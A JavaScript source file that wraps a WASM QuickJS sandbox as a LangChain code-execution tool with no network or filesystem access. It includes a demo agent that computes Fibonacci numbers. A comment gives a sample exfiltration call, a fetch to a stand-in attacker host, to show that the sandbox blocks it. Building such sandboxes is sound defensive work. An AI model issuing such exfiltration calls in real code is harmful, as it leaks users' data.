import { tool } from "langchain";
import { z } from "zod";
import { sandboxedJsTool } from "@wasmagent/aisdk";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
import { createAgent, HumanMessage } from "langchain";
import Anthropic from "@anthropic-ai/sdk";

/**
 * Sandboxed JavaScript execution tool using WasmAgent QuickJS kernel.
 *
 * Install:
 *   npm add @wasmagent/aisdk @wasmagent/kernel-quickjs  *     quickjs-emscripten @jitl/quickjs-wasmfile-release-sync
 *
 * The kernel runs user-supplied code inside a WASM isolate with a
 * CapabilityManifest — no outbound network, no filesystem, 5 s CPU cap.
 */

const execTool = sandboxedJsTool({
  kernel: new QuickJSKernel(),
  capabilities: {
    allowedHosts: [],            // no outbound network
    allowedPaths: [],            // no filesystem
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

// Wrap as a LangChain tool
const sandboxedExecTool = tool(
  async ({ code }) => {
    const result = await execTool.execute({ code });
    return JSON.stringify(result);
  },
  {
    name: "execute_js",
    description:
      "Execute a JavaScript snippet in a WASM sandbox. " +
      "No network, no filesystem. Returns { output, logs, error }.",
    schema: z.object({
      code: z.string().describe("JavaScript code to execute"),
    }),
  }
);

// Security demo: CapabilityManifest blocks network exfiltration
// Running fetch("https://attacker.example/exfil") inside the sandbox throws:
// "network access denied — host 'attacker.example' not in allowedHosts"

// ── Agent demo ──────────────────────────────────────────────────────────────
// Requires ANTHROPIC_API_KEY. The sandboxed tool itself needs no key.

const client = new Anthropic();

const agent = createAgent({
  llm: client,
  tools: [sandboxedExecTool],
  model: "claude-haiku-4-5-20251001",
});

const result = await agent.invoke({
  messages: [
    new HumanMessage(
      "Use execute_js to compute the first 10 Fibonacci numbers."
    ),
  ],
});

console.log(result.messages.at(-1)?.content);
